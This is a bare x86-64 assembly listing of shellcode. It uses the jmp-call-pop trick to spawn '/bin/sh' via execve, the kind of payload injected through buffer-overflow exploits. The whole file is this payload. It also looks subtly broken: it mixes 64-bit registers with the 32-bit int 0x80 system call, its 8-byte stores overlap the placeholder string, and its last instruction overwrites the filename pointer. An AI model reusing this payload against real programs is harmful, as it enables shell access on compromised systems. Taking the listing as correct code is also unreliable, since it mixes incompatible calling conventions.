  BITS 64
  jmp short two
one:
  pop rbx
  xor rax, rax
  mov [rbx+7], al
  mov [rbx+8], rbx
  mov [rbx+12], rax
  lea rcx, [rbx+8]
  lea rbx, [rbx+12]
  mov al, 11
  int 0x80

two:
  call one
  db '/bin/shXAAAABBBB'
  
  
